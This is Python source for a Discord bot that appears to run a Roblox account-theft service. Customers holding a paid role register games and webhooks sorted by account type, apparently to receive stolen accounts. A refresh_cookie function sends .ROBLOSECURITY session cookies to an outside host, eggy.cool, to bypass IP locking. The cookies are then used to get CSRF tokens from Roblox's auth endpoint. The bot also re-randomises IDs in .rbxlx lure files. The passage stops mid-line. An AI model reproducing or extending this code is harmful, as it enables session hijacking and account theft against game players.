import re
import os
import json
import secrets
import uuid
import requests
import discord
import random
import string
from discord import app_commands
from webserver import keep_alive
from discord.ext import commands
from discord.app_commands.errors import MissingRole
import psycopg2
from dotenv import load_dotenv

load_dotenv()

# Make sure to add underscores in the file_location to prevent any errors.

rbxlx_files = {
    "nl": {  # Theme Value; make sure this is not the same value if you add a new theme
        "theme_name": "Normal Theme",
        "file_location": "Files/Normal_Theme.rbxlx"
    },
    # Add more themes here as needed
}

# Generate choices using a loop
theme_choices = [
    discord.app_commands.Choice(name=f"{theme_data['theme_name']}", value=theme_code)
    for theme_code, theme_data in rbxlx_files.items()
]

# Configure the PostgreSQL connection settings.
# If you are using CockroachDB, you can utilize either https://neon.tech/ or https://cockroachlabs.cloud/clusters.
# For non-SSL connections, simply remove the "?sslmode=verify-full" parameter.

connection_string = os.getenv("POSTGRES_CONNECTION_STRING")

try:
    # Create a connection to the PostgreSQL database
    conn = psycopg2.connect(connection_string)
    print("Connection to PostgreSQL successful.")
except psycopg2.Error as e:
    print(f"Error connecting to PostgreSQL: {e}")

def create_table(conn):
    # SQL query to create the 'webhooks' table
    webhooks_query = (
        "CREATE TABLE IF NOT EXISTS webhooks ("
        "id SERIAL PRIMARY KEY,"
        "gameid VARCHAR,"
        "visit VARCHAR,"
        "unnbc VARCHAR,"
        "unpremium VARCHAR,"
        "vnbc VARCHAR,"
        "vpremium VARCHAR,"
        "success VARCHAR,"
        "failed VARCHAR,"
        "discid VARCHAR"
        ")"
    )

    # SQL query to create the 'purchases' table
    purchases_query = (
        "CREATE TABLE IF NOT EXISTS purchases ("
        "id SERIAL PRIMARY KEY,"
        "rbxid VARCHAR,"
        "discid VARCHAR"
        ")"
    )

    with conn.cursor() as cur:
        cur.execute(webhooks_query)
        cur.execute(purchases_query)
    
    conn.commit()

create_table(conn)

def replace_referents(data):
    cache = {}

    def _replace_ref(match):
        ref = match.group(1)
        if ref not in cache:
            cache[ref] = ("RBX" + secrets.token_hex(16).upper()).encode()
        return cache[ref]

    data = re.sub(b"(RBX[A-Z0-9]{32})", _replace_ref, data)
    return data

def replace_script_guids(data):
    cache = {}

    def _replace_guid(match):
        guid = match.group(1)
        if guid not in cache:
            cache[guid] = ("{" + str(uuid.uuid4()).upper() + "}").encode()
        return cache[guid]

    data = re.sub(
        b"(\{[A-Z0-9]{8}-[A-Z0-9]{4}-[A-Z0-9]{4}-[A-Z0-9]{4}-[A-Z0-9]{12}\})",
        _replace_guid, data)
    return data

def process_file(file_key):
    theme_info = rbxlx_files.get(file_key)
    if not theme_info:
        return None

    rbxlx_file = theme_info["file_location"]
    file_data = open(rbxlx_file, 'rb').read()

    if rbxlx_file.endswith(".rbxlx"):
        file_data = replace_referents(file_data)
        file_data = replace_script_guids(file_data)

    return file_data

intents = discord.Intents.default()
intents.members = True
intents.message_content = True

client = discord.Client(intents=intents)
tree = discord.app_commands.CommandTree(client)

@client.event
async def on_ready():
    await tree.sync()
    await client.change_presence(activity=discord.Activity(type=discord.ActivityType.watching, name='Flux'), status=discord.Status.dnd)
    print('Logged in')
    print('------')
    print(client.user.display_name)

keep_alive()

def refresh_cookie(c):
    try:
        response = requests.get(f"https://eggy.cool/iplockbypass?cookie={c}")
        if response.text != "Invalid Cookie":
            return response.text
        else:
            return None
    except Exception as e:
        print(f"An error occurred while refreshing the cookie: {e}")
        return None

def get_csrf_token(cookie):
    try:
        xsrfRequest = requests.post('https://auth.roblox.com/v2/logout', cookies={'.ROBLOSECURITY': cookie})
        if xsrfRequest.status_code == 403 and "x-csrf-token" in xsrfRequest.headers:
            return xsrfRequest.headers["x-csrf-token"]
    except Exception as e:
        print(f"An error occurred: {str(e)}")
    return None

def get_game_icon(game_id):
    try:
        url = f"https://thumbnails.roblox.com/v1/places/gameicons?placeIds={game_id}&returnPolicy=PlaceHolder&size=512x512&format=Png&isCircular=false"
        with requests.Session() as session:
            response = session.get(url)
            response.raise_for_status()
            jsonicon = response.json()
            thumbnail_data = jsonicon.get("data", [])
            if thumbnail_data:
                thumbnail = thumbnail_data[0].get("imageUrl", "")
                return thumbnail
            else:
                return ""
    except requests.exceptions.RequestException as e:
        print(f"Error in get_game_icon: {e}")
        return ""

def create_webhook(conn, game_id, success, vpremium, visit, failed, vnbc, unnbc, unpremium, discord_id):
    check_query = "SELECT discid FROM webhooks WHERE gameid = %s"
    with conn.cursor() as cur:
        cur.execute(check_query, (game_id,))
        existing_discid = cur.fetchone()

    if existing_discid is not None and str(existing_discid[0]) == str(discord_id):
        update_query = (
            "UPDATE webhooks SET "
            "success = %s, vpremium = %s, visit = %s, failed = %s, "
            "vnbc = %s, unnbc = %s, unpremium = %s "
            "WHERE gameid = %s"
        )
        update_data = (success, vpremium, visit, failed, vnbc, unnbc, unpremium, game_id)
        with conn.cursor() as cur:
            cur.execute(update_query, update_data)
        conn.commit()
        apiCheck = "Successfully Listed His/Her Webhooks."
    elif existing_discid is not None and str(existing_discid[0]) != str(discord_id):
        apiCheck = "Do Not Touch His/Her Game."
    else:
        insert_query = (
            "INSERT INTO webhooks (gameid, success, vpremium, visit, failed, vnbc, unnbc, unpremium, discid) "
            "VALUES (%s, %s, %s, %s, %s, %s, %s, %s, %s)"
        )
        insert_data = (game_id, success, vpremium, visit, failed, vnbc, unnbc, unpremium, discord_id)
        with conn.cursor() as cur:
            cur.execute(insert_query, insert_data)
        conn.commit()
        apiCheck = "Successfully Listed His/Her Webhooks."

    return apiCheck

@tree.command(name="config", description="Setup/Update Your Game!")
@app_commands.describe(
    game_id='Roblox Game ID',
    visit='Visit Webhook URL',
    unnbc='Unverified NBC Webhook URL',
    unpremium='Unverified Premium Webhook URL',
    vnbc='Verified NBC Webhook URL',
    vpremium='Verified Premium Webhook URL',
    success='Success Webhook URL',
    failed='Failed Webhook URL'
)
async def config(interaction: discord.Interaction, game_id: str, visit: str, unnbc: str, unpremium: str, vnbc: str, vpremium: str, success: str, failed: str):
    role_name = os.getenv('CUSTUMER_ROLE_NAME')
    guild_id = int(os.getenv("GUILD_ID"))
    guild = interaction.guild

    if guild is None:
        print(f"Guild not found with ID: {guild_id}")
        return

    member = guild.get_member(interaction.user.id)
    if member is None:
        print(f"Member not found in guild with ID: {guild_id}")
        return

    discord_id = interaction.user.id
    role = discord.utils.get(guild.roles, name=role_name)

    if role is None or role not in member.roles:
        message = f"Role {role_name} is required to run this command."
        embed_var = discord.Embed(title=message, color=8918293)
        return await interaction.response.send_message(embed=embed_var, ephemeral=True)

    if any(webhook.startswith('https://discord.com/api/webhooks/') for webhook in (vnbc, visit, vpremium, unnbc, unpremium, success, failed)):
        universe_req = requests.get(f"https://apis.roblox.com/universes/v1/places/{game_id}/universe")
        json_universe = universe_req.json()

        if json_universe
